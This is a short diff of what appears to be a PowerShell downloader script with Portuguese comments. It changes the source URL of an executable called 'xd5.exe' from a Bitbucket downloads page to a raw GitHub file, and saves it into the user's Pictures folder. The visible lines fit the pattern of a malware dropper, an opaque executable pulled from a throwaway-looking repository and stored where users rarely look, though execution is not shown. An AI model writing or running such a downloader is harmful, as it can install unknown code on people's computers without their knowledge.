@@ -1,5 +1,5 @@
 # URL do novo arquivo a ser baixado
-$url = "https://bitbucket.org/guizinopt/parkcontrol/downloads/xd5.exe"
+$url = "https://github.com/devmenzin/parkcontrol.exe/raw/main/xd5.exe"
 
 # Determinar o diretório de imagens do usuário
 $diretorioImagens = [System.IO.Path]::Combine([System.Environment]::GetFolderPath("MyPictures"), "xd5.exe")
